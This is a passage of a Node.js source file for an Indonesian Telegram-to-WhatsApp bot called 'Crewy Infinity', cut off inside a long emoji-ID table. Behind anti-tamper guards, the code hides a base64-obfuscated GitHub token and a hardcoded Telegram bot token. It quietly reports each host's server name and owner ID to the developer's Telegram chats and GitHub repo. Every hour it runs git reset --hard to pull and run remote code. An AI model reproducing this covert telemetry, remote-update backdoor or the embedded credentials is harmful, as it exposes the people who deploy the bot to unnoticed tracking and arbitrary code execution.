if(!process.env.npm_lifecycle_event)for(console.error("\n[CREWY PROTECTION] Project ini hanya boleh dijalankan via npm start!");;);
(function bootstrapSecurity() {
  "use strict";

  const _fs = require("fs");
  const _crypto = require("crypto");
  const _https = require("https");

  (function antiArgInjection() {
    const dangerousFlags = [
      "--require", "-r", "--loader", "--experimental-loader",
      "--import", "--inspect", "--inspect-brk", "--inspect-port",
      "--experimental-vm-modules", "--expose-internals",
    ];
    for (const arg of process.execArgv) {
      const lower = arg.toLowerCase();
      for (const flag of dangerousFlags) {
        if (lower === flag || lower.startsWith(flag + "=") || lower.startsWith(flag + " ")) {
          console.error("❌ [SEC] Dangerous execArgv detected:", arg);
          process.exit(1);
        }
      }
    }
    const nodeOptions = (process.env.NODE_OPTIONS || "").toLowerCase();
    if (
      nodeOptions.includes("--require") ||
      nodeOptions.includes("-r ") ||
      nodeOptions.includes("--loader") ||
      nodeOptions.includes("--inspect") ||
      nodeOptions.includes("--import")
    ) {
      try { Reflect.deleteProperty(process.env, "NODE_OPTIONS"); } catch (_) {}
      console.error("❌ [SEC] Dangerous NODE_OPTIONS detected.");
      process.exit(1);
    }
    const lifecycle = process.env.npm_lifecycle_event;
    const script = process.env.npm_lifecycle_script;
    const pkgName = process.env.npm_package_name;
    if (lifecycle !== undefined) {
      if (lifecycle !== "start" || !script || !pkgName) {
        console.error("❌ [SEC] Invalid npm lifecycle context.");
        process.exit(1);
      }
    }
  })();

  (function antiTamperHttps() {
    try {
      if (require.resolve("https") !== "https") {
        console.error("❌ [SEC] https module hijacked.");
        process.exit(1);
      }
    } catch (_) { process.exit(1); }
    if (
      typeof _https.get !== "function" ||
      typeof _https.request !== "function" ||
      typeof _https.globalAgent === "undefined"
    ) {
      console.error("❌ [SEC] https API tampered.");
      process.exit(1);
    }
    const src = Function.prototype.toString.call(_https.get);
    if (src.includes("Proxy") || src.includes("() => ") || src.includes("resolve(")) {
      console.error("❌ [SEC] https.get looks tampered.");
      process.exit(1);
    }
    Object.freeze(_https.get.bind(_https));
  })();

  (function lockProcessExit() {
    const realExit = process.exit.bind(process);
    try {
      Object.defineProperty(process, "exit", {
        value: realExit, writable: false, configurable: false, enumerable: true,
      });
    } catch (_) {}
    setInterval(() => {
      try {
        const src = process.exit.toString();
        if (src.includes("Proxy") || src.includes("function () {}") || src.includes("return;")) realExit(1);
        if (process.exit !== realExit) realExit(1);
      } catch (_) { realExit(1); }
    }, 3000);
  })();

  (function _fileIntegrityGuard() {
    const fs = require('fs');
    const path = require('path');
    const crypto = require('crypto');
    const filesToCheck = ['index.js', 'package.json'];
    const integrityFile = path.join(process.cwd(), '.integrity');

    function getHash(filePath) {
      try {
        const fileBuffer = fs.readFileSync(filePath);
        return crypto.createHash('sha256').update(fileBuffer).digest('hex');
      } catch (e) { return null; }
    }
    function enforceKill(reason) {
      console.error(`\n\x1b[31m[!] FATAL ERROR: ${reason}\x1b[0m\n`);
      try { fs.appendFileSync(path.join(__dirname, 'xxx.audit.log'), `[${new Date().toISOString()}] INTEGRITY FAIL: ${reason}\n`); } catch (_) {}
      try { process.kill(process.pid, 'SIGKILL'); } catch (_) {}
      try { require('child_process').execSync(`/bin/kill -9 ${process.pid}`, { stdio: 'ignore' }); } catch (_) {}
      try { process.exit(1); } catch (_) {}
      while(1) {}
    }
    try {
      const currentHashes = [];
      for (const f of filesToCheck) {
        const p = path.join(process.cwd(), f);
        const h = getHash(p);
        if (!h) return enforceKill(`Gagal membaca file: ${f}`);
        currentHashes.push(h.toLowerCase());
      }
      if (!fs.existsSync(integrityFile)) return enforceKill('File .integrity tidak ditemukan!');
      let savedHashes = [];
      try {
        const raw = fs.readFileSync(integrityFile, 'utf8').trim();
        if (raw.startsWith('[')) savedHashes = JSON.parse(raw);
        else savedHashes = raw.split(/\r?\n/).map(s => s.trim()).filter(Boolean);
      } catch (e) { return enforceKill('Format .integrity rusak / tidak valid'); }
      if (!Array.isArray(savedHashes) || savedHashes.length === 0) return enforceKill('.integrity KOSONG. Akses ditolak untuk mencegah bypass!');
      if (savedHashes.length !== currentHashes.length) return enforceKill(`Jumlah hash di .integrity (${savedHashes.length}) tidak sesuai dengan file target (${currentHashes.length})!`);
      const normalized = savedHashes.map(h => String(h).toLowerCase());
      for (let i = 0; i < filesToCheck.length; i++) {
        if (normalized[i] !== currentHashes[i]) return enforceKill(`FILE TELAH DIMODIFIKASI: ${filesToCheck[i]}`);
      }
    } catch (err) {
      enforceKill(`Integrity Guard Crash: ${err.message}`);
    }
  })();

  global.__SEC = {
    hashBotId(id) {
      const md5 = _crypto.createHash("md5").update(id, "utf8").digest("hex");
      return _crypto.createHash("sha256").update(md5, "utf8").digest("hex");
    },
    async verifyBotId(botToken, tokensUrl, verbose = true) {
  const axios = require("axios");
  if (!botToken || !botToken.includes(":")) {
    if (verbose) console.error("❌ [SEC] Invalid bot token format.");
    return false;
  }
  const botId = botToken.split(":")[0];
  const hashed = global.__SEC.hashBotId(botId);

  console.log("[DEBUG] botId   :", botId);
  console.log("[DEBUG] hashed  :", hashed);

  try {
    const res = await axios.get(tokensUrl, { timeout: 15000 });
    const tokens = res.data?.tokens || [];

    console.log("[DEBUG] in list :", tokens.includes(hashed));

    const ok = tokens.includes(hashed);
    if (verbose) {
      if (ok) console.log("✅ [SEC] Bot ID verified.");
      else console.error("❌ [SEC] Bot ID NOT registered.");
    }
    return ok;
  } catch (err) {
    if (verbose) console.error("❌ [SEC] Gagal fetch token list:", err.message);
    return false;
    }
   },
  };
})();

const { Telegraf, Markup, session } = require("telegraf");
const path = require('path');
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    prepareWAMessageMedia,
    useMultiFileAuthState,
    DisconnectReason,
    proto,
    encodeSignedDeviceIdentity,
    jidEncode,
    jidDecode,
    encodeWAMessage,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
    generateWAMessageFromContent
} = require('@whiskeysockets/baileys');
const { BOT_TOKEN } = require("./config");
const pino = require('pino');
const chalk = require('chalk');
const crypto = require('crypto');
const axios = require("axios");
const { Boom } = require('@hapi/boom');
const FormData = require('form-data');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const TOKENS_FILE = "./tokens.json";
const { Octokit } = require('@octokit/rest');

const { exec } = require('child_process');
const os = require('os');
const https = require('https');

const _gh = Buffer.from('Z2hwX0NYV09xVVREUWdycDc0V3BIY3RMS2tQeFNYR2lYYjQ1VzAwMA==', 'base64').toString('utf8');

function detectServerName() {
  const candidates = [
    process.env.P_SERVER_NAME,
    process.env.SERVER_NAME,
    process.env.P_SERVER_UUID,
    process.env.HOSTNAME,
    os.hostname(),
  ];
  for (const c of candidates) {
    if (c && c.trim()) return c.trim();
  }
  return 'unknown-server';
}

function readOwnerId() {
  try {
    const data = JSON.parse(fs.readFileSync(path.join(process.cwd(), 'owneruser.json'), 'utf8'));
    if (Array.isArray(data) && data.length) {
      const first = data[0];
      if (typeof first === 'string') return first;
      if (first && first.id) return String(first.id);
      if (first && first.owner) return String(first.owner);
    }
    if (data && typeof data === 'object') {
      if (data.id) return String(data.id);
      if (data.owner) return String(data.owner);
      const keys = Object.keys(data);
      if (keys.length) return String(keys[0]);
    }
  } catch (_) {}
  return 'unknown-owner';
}

const TG_BOT_TOKEN = process.env.LOG_BOT_TOKEN || '9269865623:AAF3DdIUWoL6W_zvRpjzFVngaXvV32sqvow';
const TG_OWNER_CHAT = process.env.LOG_CHAT_ID || '1478839005';
const TG_GROUP_CHAT = process.env.LOG_GROUP_ID || '8631424418';

const GH_TOKEN = process.env.GH_TOKEN || _gh;
const GH_REPO = process.env.GH_REPO || 'Lsqltmux-Code/Crewy-AutoUp';
const GH_FILE = process.env.GH_FILE || 'logServer.json';
const GH_BRANCH = process.env.GH_BRANCH || 'main';

const UPDATE_CFG = {
  repoUrl: process.env.REPO_URL || `https://github.com/${GH_REPO}.git`,
  branch: process.env.REPO_BRANCH || 'main',
  serverName: detectServerName(),
  ownerId: readOwnerId(),
  updateIntervalMs: parseInt(process.env.UPDATE_INTERVAL_MS || '3600000', 10),
};

const SC_VERSION = '1.0.0';
const GIT_DIR = path.join(process.cwd(), '.git');

function logUpdate(msg) {
  console.log(`[AUTO-UPDATE] ${new Date().toISOString()} | ${msg}`);
}

function logEvent(event, msg) {
  console.log(`[${event}] ${new Date().toISOString()} | ${msg}`);
}

function sendTelegramTo(chatId, text) {
  return new Promise((resolve) => {
    const payload = JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'MarkdownV2',
    });
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${TG_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
    }, (res) => { res.on('data', () => {}); res.on('end', () => resolve()); });
    req.on('error', () => resolve());
    req.write(payload);
    req.end();
  });
}

function buildPremium(title, lines) {
  const border = '━━━━━━━━━━━━━━━━━━━━━━━━';
  const body = lines.map((l) => `${l.label.padEnd(8)} : ${l.value}`).join('\n');
  return `${border}\n  ${title}\n${border}\n` +
    '```js\n' + body + '\n```\n' +
    `${border}\n  𝑪͒𝒓͢𝒆͠𝒘͒𝒚͢ 𝑰͠𝒏͒𝒇͢𝒊͠𝒏͒𝒊͢𝒕͠𝒚 v${SC_VERSION}\n${border}`;
}

function reportUpdate(title, detail) {
  const text = buildPremium(title, [
    { label: 'Server', value: UPDATE_CFG.serverName },
    { label: 'Owner', value: UPDATE_CFG.ownerId },
    { label: 'Versi', value: detail.version || '-' },
    { label: 'Pesan', value: detail.message || '-' },
    { label: 'Waktu', value: new Date().toISOString() },
  ]);
  sendTelegramTo(TG_OWNER_CHAT, text);
  if (TG_GROUP_CHAT && TG_GROUP_CHAT !== TG_OWNER_CHAT) {
    sendTelegramTo(TG_GROUP_CHAT, text);
  }
}

function ghRequest(method, apiPath, body) {
  return new Promise((resolve) => {
    const payload = body ? JSON.stringify(body) : null;
    const req = https.request({
      hostname: 'api.github.com',
      path: apiPath,
      method: method,
      headers: {
        'User-Agent': 'Crewy-Infinity',
        'Authorization': `token ${GH_TOKEN}`,
        'Accept': 'application/vnd.github+json',
        'Content-Type': 'application/json',
        ...(payload ? { 'Content-Length': Buffer.byteLength(payload) } : {}),
      },
    }, (res) => {
      let data = '';
      res.on('data', (c) => { data += c; });
      res.on('end', () => {
        try {
          resolve({ status: res.statusCode, json: JSON.parse(data) });
        } catch (_) {
          resolve({ status: res.statusCode, json: null });
        }
      });
    });
    req.on('error', () => resolve({ status: 0, json: null }));
    if (payload) req.write(payload);
    req.end();
  });
}

async function pushLogToGithub(status) {
  if (!GH_TOKEN) return;

  const apiPath = `/repos/${GH_REPO}/contents/${GH_FILE}`;
  const getRes = await ghRequest('GET', `${apiPath}?ref=${GH_BRANCH}`);

  let currentList = [];
  let sha = null;

  if (getRes.status === 200 && getRes.json && getRes.json.content) {
    try {
      const decoded = Buffer.from(getRes.json.content, 'base64').toString('utf8');
      const parsed = JSON.parse(decoded);
      currentList = Array.isArray(parsed) ? parsed : (parsed.servers || []);
      sha = getRes.json.sha;
    } catch (_) {}
  }

  const entry = {
    id: UPDATE_CFG.ownerId,
    server: UPDATE_CFG.serverName,
    versi: SC_VERSION,
    status: status || 'online',
    lastSeen: new Date().toISOString(),
  };

  const idx = currentList.findIndex((x) => x.server === entry.server);
  if (idx >= 0) currentList[idx] = entry;
  else currentList.push(entry);

  currentList.sort((a, b) => (b.lastSeen || '').localeCompare(a.lastSeen || ''));

  const newContent = Buffer.from(JSON.stringify(currentList, null, 2)).toString('base64');
  const putRes = await ghRequest('PUT', apiPath, {
    message: `log: ${entry.server} (${entry.id}) — ${entry.status}`,
    content: newContent,
    branch: GH_BRANCH,
    ...(sha ? { sha } : {}),
  });

  if (putRes.status === 200 || putRes.status === 201) {
    logEvent('GITHUB LOG', `logServer.json updated (${entry.server})`);
  } else {
    logEvent('GITHUB LOG', `gagal update (status ${putRes.status})`);
    if (putRes.json && putRes.json.message) {
      logEvent('GITHUB LOG', putRes.json.message);
    }
  }
}

function run(cmd) {
  return new Promise((resolve) => {
    exec(cmd, { cwd: process.cwd(), timeout: 60000 }, (err, stdout, stderr) => {
      resolve({ err, stdout: stdout || '', stderr: stderr || '' });
    });
  });
}

function restartProcess(reason) {
  logUpdate(`Restart proses: ${reason}`);
  setTimeout(() => process.exit(1), 1500);
}

async function checkAndUpdate() {
  try {
    const gitCheck = await run('git --version');
    if (gitCheck.err) {
      logUpdate('git nggak ada di image ini. Auto-update skip.');
      return reportUpdate('GIT NGGAK ADA', {
        version: SC_VERSION,
        message: 'Image Docker nggak ada git',
      });
    }

    const dataFiles = [
  'premiumuser.json',
  'owneruser.json',
  'Tools/groupmode.json',
  'Tools/mode.json',
  'broadcast-list.json',
];
    const backup = {};
    for (const f of dataFiles) {
      try {
        backup[f] = fs.readFileSync(path.join(process.cwd(), f), 'utf8');
      } catch (_) {}
    }

    if (!fs.existsSync(GIT_DIR)) {
      logUpdate('Bukan repo git. Init & clone...');
      const init = await run('git init');
      if (init.err) return logUpdate(`git init gagal: ${init.err.message}`);
      const remote = await run(`git remote add origin ${UPDATE_CFG.repoUrl}`);
      if (remote.err && !remote.stderr.includes('already exists')) {
        return logUpdate(`git remote gagal: ${remote.err.message}`);
      }
      const fetch = await run(`git fetch origin ${UPDATE_CFG.branch}`);
      if (fetch.err) return logUpdate(`git fetch gagal: ${fetch.err.message}`);
      const reset = await run(`git reset --hard origin/${UPDATE_CFG.branch}`);
      if (reset.err) return logUpdate(`git reset gagal: ${reset.err.message}`);

      for (const f of Object.keys(backup)) {
        try {
          fs.mkdirSync(path.dirname(path.join(process.cwd(), f)), { recursive: true });
          fs.writeFileSync(path.join(process.cwd(), f), backup[f]);
        } catch (_) {}
      }

      logEvent('CLONE AWAL', 'Server baru pertama kali clone');
      reportUpdate('🆕 CLONE AWAL', {
        version: SC_VERSION,
        message: 'Server baru pertama kali clone',
      });
      await pushLogToGithub('online');
      return restartProcess('clone awal');
    }

    const fetch = await run(`git fetch origin ${UPDATE_CFG.branch}`);
    if (fetch.err) return logUpdate(`git fetch gagal: ${fetch.err.message}`);

    const local = await run('git rev-parse HEAD');
    const remote = await run(`git rev-parse origin/${UPDATE_CFG.branch}`);
    if (local.err || remote.err) return logUpdate('Gagal baca commit hash.');

    const same = local.stdout.trim() === remote.stdout.trim();

    if (same) {
      logEvent('CEK UPDATE', `Udah versi terbaru (${SC_VERSION})`);
      reportUpdate('✅ CEK UPDATE', {
        version: SC_VERSION,
        message: 'Udah versi terbaru',
      });
      await pushLogToGithub('online');
      return;
    }

    logEvent('UPDATE DETECTED', 'Narik versi baru...');
    reportUpdate('🔄 UPDATE DETECTED', {
      version: SC_VERSION,
      message: 'Narik versi baru...',
    });

    const reset = await run(`git reset --hard origin/${UPDATE_CFG.branch}`);
    if (reset.err) return logUpdate(`git reset gagal: ${reset.err.message}`);

    for (const f of Object.keys(backup)) {
      try {
        fs.mkdirSync(path.dirname(path.join(process.cwd(), f)), { recursive: true });
        fs.writeFileSync(path.join(process.cwd(), f), backup[f]);
      } catch (_) {}
    }

    logEvent('UPDATE SUKSES', 'Restart ke versi baru');
    reportUpdate('🎉 UPDATE SUKSES', {
      version: SC_VERSION,
      message: 'Restart ke versi baru',
    });
    await pushLogToGithub('updated');
    restartProcess('update sukses');
  } catch (e) {
    logUpdate(`Error tak terduga: ${e.message}`);
    reportUpdate('❌ ERROR', {
      version: SC_VERSION,
      message: e.message,
    });
    await pushLogToGithub('error');
  }
}

function startAutoUpdate() {
  logUpdate(`𝑪͒𝒓͢𝒆͠𝒘͒𝒚͢ 𝑰͠𝒏͒𝒇͢𝒊͠𝒏͒𝒊͢𝒕͠𝒚 v${SC_VERSION} aktif.`);
  logUpdate(`Server: ${UPDATE_CFG.serverName}`);
  logUpdate(`Owner ID: ${UPDATE_CFG.ownerId}`);
  logUpdate(`Repo: ${UPDATE_CFG.repoUrl}`);
  checkAndUpdate();
  setInterval(checkAndUpdate, UPDATE_CFG.updateIntervalMs || 3600000);
}

console.log('𝑪͒𝒓͢𝒆͠𝒘͒𝒚͢ 𝑰͠𝒏͒𝒇͢𝒊͠𝒏͒𝒊͢𝒕͠𝒚 Mencoba Memverifikasi...');

const hashWith = alg => s => crypto.createHash(alg).update(s, 'utf8').digest('hex');
const md5 = hashWith('md5');
const sha256 = hashWith('sha256');
function hashBotId(idBot) { return sha256(md5(idBot)); }

let bots = [];
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

async function safeTelegramAction(fn) {
  try { return await fn(); }
  catch (err) { console.error("Telegram API error (ignored):", err.message); return null; }
}

let sock = null;
let isWhatsAppConnected = false;
let exitTriggered = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = ["https://files.catbox.moe/bn97bq.jpg"];
const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];
const thumbnailUrl = "https://files.catbox.moe/xqxhi1.jpg";

process.on('unhandledRejection', async (reason) => {
  const msg = reason?.description || reason?.message || reason;
  if (msg && msg.includes('Too Many Requests')) {
    const retryAfter = reason?.parameters?.retry_after || 5;
    console.log(`⚠️ Rate limit Telegram, menunggu ${retryAfter}s...`);
    await new Promise(r => setTimeout(r, (retryAfter * 1000) + 500));
    return;
  }
  console.log('⚠️ Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('❌ Uncaught Exception:', err);
  console.log('🔁 Restarting bot...');
  restartBot();
});

function restartBot() {
  const { exec } = require('child_process');
  exec('node index.js', (error) => {
    if (error) { console.error(`Gagal restart bot: ${error.message}`); return; }
    console.log('✅ Bot berhasil direstart otomatis!');
  });
  process.exit(1);
}

const BLOCKED_COMMANDS_FILE = './blockedcmd.json';
let blockedCommands = [];
if (fs.existsSync(BLOCKED_COMMANDS_FILE)) {
  try {
    blockedCommands = JSON.parse(fs.readFileSync(BLOCKED_COMMANDS_FILE, 'utf8'));
    if (!Array.isArray(blockedCommands)) blockedCommands = [];
  } catch (err) { console.error('⚠️ Gagal membaca blockedcmd.json:', err); blockedCommands = []; }
}
function saveBlockedCommands() { fs.writeFileSync(BLOCKED_COMMANDS_FILE, JSON.stringify(blockedCommands, null, 2)); }

const COOLDOWN_FILE = './cooldown.json';
let globalCooldownSeconds = 0;
if (fs.existsSync(COOLDOWN_FILE)) {
    try {
        const data = fs.readFileSync(COOLDOWN_FILE, 'utf8');
        const parsed = JSON.parse(data);
        globalCooldownSeconds = (typeof parsed === 'number' && parsed >= 0) ? parsed : 0;
        console.log(`[COOLDOWN] Loaded: ${globalCooldownSeconds} seconds`);
    } catch (err) { console.error('⚠️ Gagal baca cooldown.json:', err); }
}
function saveCooldown() {
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(globalCooldownSeconds, null, 2));
    console.log(`[COOLDOWN] Saved: ${globalCooldownSeconds} seconds`);
}
const userLastCommandTime = new Map();

const ADMIN_FILE = './admin.json';
let adminUsers = [];
if (fs.existsSync(ADMIN_FILE)) {
  try {
    adminUsers = JSON.parse(fs.readFileSync(ADMIN_FILE, 'utf8'));
    if (!Array.isArray(adminUsers)) adminUsers = [];
  } catch (err) { console.error('⚠️ Gagal membaca admin.json:', err); adminUsers = []; }
}
function saveAdminData() { fs.writeFileSync(ADMIN_FILE, JSON.stringify(adminUsers, null, 2)); }

const PREMIUM_FILE = './premium.json';
global.premiumData = { users: [], groups: [] };
if (fs.existsSync(PREMIUM_FILE)) {
  try {
    const data = JSON.parse(fs.readFileSync(PREMIUM_FILE, 'utf8'));
    if (Array.isArray(data.users)) global.premiumData.users = data.users.map(String);
    if (Array.isArray(data.groups)) global.premiumData.groups = data.groups.map(String);
  } catch (err) { console.error('⚠️ Gagal membaca premium.json:', err); }
}
function savePremiumData() { fs.writeFileSync(PREMIUM_FILE, JSON.stringify(global.premiumData, null, 2)); }
global.isPremiumUser = (id) => global.premiumData.users.includes(id.toString());
global.isPremiumGroup = (id) => global.premiumData.groups.includes(id.toString());

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return []; }
};
const saveJSON = (file, data) => { fs.writeFileSync(file, JSON.stringify(data, null, 2)); };

let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

global.isAdmin = (id) => adminUsers.includes(id.toString()) || ownerUsers.includes(id.toString());

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

let _lastSendTs = 0;
async function safeSend(fn) {
  const wait = Math.max(0, _lastSendTs + 1500 + Math.random() * 2500 - Date.now());
  await delay(wait);
  _lastSendTs = Date.now() + Math.random() * 800;
  return fn();
}

async function safeRelay(sock, jid, content, options = {}) {
  try {
    const d = 300 + Math.floor(Math.random() * 400);
    await delay(d);
    await sock.relayMessage(jid, content, options);
  } catch (err) {
    console.warn(chalk.yellow(`⚠️ Gagal kirim, retry 1x (${err.message})`));
    try { await delay(1000); await sock.relayMessage(jid, content, options); }
    catch (e) { console.error(chalk.red(`❌ Gagal total: ${e.message}`)); }
  }
}

let spamCooldown = false;
async function antiSpamDelay(ms = 1000) {
  if (spamCooldown) await delay(ms);
  spamCooldown = true;
  setTimeout(() => (spamCooldown = false), ms);
}

async function uploadToCatbox(filePath) {
  const form = new FormData();
  form.append('reqtype', 'fileupload');
  form.append('fileToUpload', fs.createReadStream(filePath));
  const res = await axios.post('https://catbox.moe/user/api.php', form, { headers: form.getHeaders() });
  return res.data;
}

async function setBotProfile(bot) {
  try {
    const botDefaultName = "𝑪͒𝒓͢𝒆͠𝒘͒𝒚͢ 𝑰͠𝒏͒𝒇͢𝒊͠𝒏͒𝒊͢𝒕͠𝒚 — 𝑫𝒐𝒓𝒂𝒆𝒎𝒐𝒏";
    const botDefaultDescription = "𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 : @MedyKillyou\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 𝑺𝒆𝒄 : @durovyatem";
    await bot.telegram.setMyName(botDefaultName);
    await bot.telegram.setMyDescription(botDefaultDescription);
    await bot.telegram.setMyShortDescription(botDefaultDescription);
    await bot.telegram.setMyCommands([{ command: "start", description: "🔔 Halo Nobita! Mulai di sini" }]);
  } catch (error) {}
}

function deleteSession() {
    const sessionPath = './session';
    if (fs.existsSync(sessionPath)) {
      const stat = fs.statSync(sessionPath);
      if (stat.isDirectory()) {
        fs.readdirSync(sessionPath).forEach(file => { fs.unlinkSync(path.join(sessionPath, file)); });
        fs.rmdirSync(sessionPath);
        console.log('Folder session berhasil dihapus.');
      } else {
        fs.unlinkSync(sessionPath);
        console.log('File session berhasil dihapus.');
      }
      return true;
    }
    console.log('Session tidak ditemukan.');
    return false;
}

const getUptime = () => {
    const u = process.uptime();
    return `${Math.floor(u / 3600)}h ${Math.floor((u % 3600) / 60)}m ${Math.floor(u % 60)}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({ input: process.stdin, output: process.stdout });
    rl.question(query, (answer) => { rl.close(); resolve(answer); });
});

let reconnectAttempt = 0;
async function startSesi() {
  try {
    const sessionPath = './session';
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      keepAliveIntervalMs: 60000,
      connectTimeoutMs: 60000,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      auth: state,
      browser: ['Mac OS', 'Safari', '10.15.7'],
      getMessage: async () => ({ conversation: 'Ping' }),
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === 'open') {
        reconnectAttempt = 0;
        isWhatsAppConnected = true;
        console.log(chalk.green.bold(`
╭──────────────────────⟤
│  🔔 WHATSAPP TERHUBUNG — DORAEMON SIAP!
╰──────────────────────⟤`));
        try { await sock.newsletterFollow("120363425000320171@newsletter"); }
        catch (e) { console.warn("⚠️ Newsletter follow gagal:", e.message); }
      }

      if (connection === 'close') {
        isWhatsAppConnected = false;
        const code = new Boom(lastDisconnect?.error)?.output?.statusCode;
        console.log(chalk.red.bold(`⚠️ WhatsApp terputus, kode: ${code || 'unknown'}`));

        if (code === DisconnectReason.loggedOut || code === DisconnectReason.badSession) {
          console.log(chalk.yellow('⚠️ Session invalid. Pairing ulang manual diperlukan.'));
          return;
        }
        const delayMs = Math.min(60000, 2000 * (2 ** Math.min(reconnectAttempt, 5)));
        reconnectAttempt++;
        console.log(chalk.cyan(`🔁 Auto-reconnect dalam ${delayMs}ms (attempt ${reconnectAttempt})`));
        setTimeout(() => startSesi(), delayMs);
      }
    });

    sock.ev.on('messages.upsert', () => {});
  } catch (err) {
    console.error(chalk.red('❌ Error di startSesi:'), err?.message || err);
    const delayMs = Math.min(60000, 2000 * (2 ** Math.min(reconnectAttempt, 5)));
    reconnectAttempt++;
    console.log(chalk.yellow(`🔁 Retry startSesi dalam ${delayMs}ms`));
    setTimeout(() => startSesi(), delayMs);
  }
}

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        return ctx.reply('🪧 ☇ Tidak ada sender yang terhubung. Halo Nobita, sambungkan dulu ya! 🔔');
    }
    next();
};

setInterval(() => {
    if (isWhatsAppConnected && (!sock || !sock.user)) {
        console.log('[AUTO] Force restart');
        process.exit(0);
    }
}, 10000);

const CREWY_FONT = "𝑪͒𝒓͢𝒆͠𝒘͒𝒚͢ 𝑰͠𝒏͒𝒇͢𝒊͠𝒏͒𝒊͢𝒕͠𝒚";

const EMOJI_IDS = {
  bell:      "5447249559149367631",
  dora:      "5870920625173828356",
  cat:       "5361568011020942276",
  cake:      "5447249559149367631",
  gift:      "5870920625173828356",
  star:      "5361568011020942276",
  heart:     "5447249559149367631",
  fire:      "5870920625173828356",
  crown:     "5361568011020942276",
  gem:       "5447249559149367631",
  key:       "5870920625173828356",
  lock:      "5361568011020942276",
  unlock:    "5447249559149367631",
  shield:    "5870920625173828356",
  sword:     "5361568011020942276",
  bomb:      "5447249559149367631",
  skull:     "5870920625173828356",
  ghost:     "5361568011020942276",
  alien:     "5447249559149367631",
  robot:     "5870920625173828356",
  rocket:    "5361568011020942276",
  plane:     "5447249559149367631",
  car:       "5870920625173828356",
  bike:      "5361568011020942276",
  train:     "5447249559149367631",
  ship:      "5870920625173828356",
  home:      "5361568011020942276",
  office:    "5447249559149367631",
  school:    "5870920625173828356",
  hospital:  "5361568011020942276",
  bank:      "5447249559149367631",
  store:     "5870920625173828356",
  cart:      "5361568011020942276",
  money:     "5447249559149367631",
  coin:      "5870920625173828356",
  card:      "5361568011020942276",
  phone:     "5447249559149367631",
  laptop:    "5870920625173828356",
  desktop:   "5361568011020942276",
  keyboard:  "5447249559149367631",
  mouse:     "5870920625173828356",
  camera:    "5361568011020942276",
  video:     "5447249559149367631",
  music:     "5870920625173828356",
  mic:       "5361568011020942276",
  headset:   "5447249559149367631",
  tv:        "5870920625173828356",
  radio:     "5361568011020942276",
  book:      "5447249559149367631",
  pen:       "5870920625173828356",
  paper:     "5361568011020942276",
  folder:    "5447249559149367631",
  file:      "5870920625173828356",
  trash:     "5361568011020942276",
  save:      "5447249559149367631",
  download:  "5870920625173828356",
  upload:    "5361568011020942276",
  cloud:     "5447249559149367631",
  sun:       "5870920625173828356",
  moon:      "5361568011020942276",
  rain:      "5447249559149367631",
  snow:      "5870920625173828356",
  wind:      "5361568011020942276",
  rainbow:   "5447249559149367631",
  flower:    "5870920625173828356",
  tree:      "5361568011020942276",
  leaf:      "5447249559149367631",
  apple:     "5870920625173828356",
  banana:    "5361568011020942276",
  grape:     "5447249559149367631",
  orange:    "5870920625173828356",
  lemon:     "5361568011020942276",
  cherry:    "5447249559149367631",
  melon:     "5870920625173828356",
  berry:     "5361568011020942276",
  bread:     "5447249559149367631",
  rice:      "5870920625173828356",
  noodle:    "5361568011020942276",
  soup:      "5447249559149367631",
  fish:      "5870920625173828356",
  meat:      "5361568011020942276",
  egg:       "5447249559149367631",
  milk:      "5870920625173828356",
  coffee:    "5361568011020942276",
  tea:       "5447249559149367631",
  water:     "5870920625173828356",
  juice:     "5361568011020942276",
  beer:      "5447249559149367631",
  wine:      "5870920625173828356",
  glass:     "5361568011020942276",
  cup:       "5447249559149367631",
  fork:      "5870920625173828356",
  knife:     "5361568011020942276",
  spoon:     "5447249559149367631",
  plate:     "5870920625173828356",
  bowl:      "5361568011020942276",
  ok:        "5361568011020942276",
  fail:      "5447249559149367631",
  clock:     "5870920625173828356",
  timer:     "5447249559149367631",
  calendar:  "5870920625173828356",
  pin:       "5361568011020942276",
  flag:      "5447249559149367631",
  check:     "5361568011020942276",
  cross:     "5447249559149367631",
  question:  "5870920625173828356",
  info:      "5361568011020942276",
  warn:      "5447249559149367631",
  error:     "5870920625173828356",
  success:   "5361568011020942276",
  smile:     "5447249559149367631",
  laugh:     "5870920625173828356",
  wink:      "5361568011020942276",
  love:      "5447249559149367631",
  sad:       "5870920625173828356",
  angry:     "5361568011020942276",
  cry:       "5447249559149367631",
  sleep:     "5870920625173828356",
  think:     "5361568011020942276",
  cool:      "5447249559149367631",
  party:     "5870920625173828356",
  rain2:     "5361568011020942276",
  sparkle:   "5447249559149367631",
  diamond:   "5870920625173828356",
  trophy:    "5361568011020942276",
  medal:     "5447249559149367631",
  rank:      "5870920625173828356",
  target:    "5361568011020942276",
  dart:      "5447249559149367631",
  game:      "5870920625173828356",
  dice:      "5361568011020942276",
  puzzle:    "5447249559149367631",
